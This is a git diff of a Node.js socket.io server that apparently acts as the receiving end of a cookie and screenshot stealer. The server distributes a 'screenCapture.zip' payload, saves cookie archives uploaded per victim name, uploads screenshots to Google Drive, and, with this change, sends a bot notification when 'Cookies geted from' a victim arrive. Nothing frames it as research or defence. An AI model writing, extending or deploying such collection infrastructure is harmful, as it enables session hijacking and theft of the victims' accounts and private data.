@@ -1,22 +1,23 @@
 const { Server } = require("socket.io");
-const fs = require('fs');
-const path = require('path');
-const {google} = require('googleapis');
-const http = require('http');
-const express = require('express');
+const fs = require("fs");
+const path = require("path");
+const {google} = require("googleapis");
+const http = require("http");
+const express = require("express");
+const bot = require("./bot/Bot.js");
 
 const app = express();
 const server = http.createServer(app);
 const io = new Server(server);
 
-const directories = ['static/Imeges', 'static/archives'];
+const directories = ['static/Imeges', 'static/archives','secret'];
 directories.forEach(dir => { if(!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true })});
 
 app.get('/', (req, res) => {
     if (req.headers['getdata']) {
         console.log("File request");
-        res.status(200).sendFile(path.join(__dirname,'static', 'screenCapture.zip'));
-        console.log("Sended")
+        try {res.status(200).sendFile(path.join(__dirname,'static', 'screenCapture.zip'));}
+        catch (err){res.status(404)}   
     }
     else{
         res.status(200).send('ok');
@@ -31,12 +32,14 @@ io.on('connection', (socket) => {
     socket.emit('give-image')
 
     let fileStream;
+    let headerName;
     socket.on('uplCookie', (data, headers) => {
         if (!fileStream) {
             fileStream = fs.createWriteStream(path.join(__dirname,'static','archives','rcf-' + headers.name + getCurrentDate() + '.zip'));
         }
         fileStream.write(data);
-        console.log(headers.name + " получение архива");
+        console.log("получение архива");
+        headerName = headers.name;
     });
 
     socket.on('end', () => {
@@ -44,6 +47,7 @@ io.on('connection', (socket) => {
             fileStream.end();
             console.log("Архив получен");
             fileStream = null;
+            bot.sendmail("Cookies geted from " + headerName);
         }
     });
 
@@ -53,7 +57,7 @@ io.on('connection', (socket) => {
         fs.writeFile(path.join(__dirname,'static', 'Imeges', headers["name"] + '.jpg'), imageBuffer, err => {
             console.log("it will be uploaded");
             const auth = new google.auth.GoogleAuth({
-                keyFile: path.join(__dirname,"security.json"),
+                keyFile: path.join(__dirname,"secret","google.json"),
                 scopes: ['https://www.googleapis.com/auth/drive'],
             });
             const drive = google.drive({version: 'v3', auth});
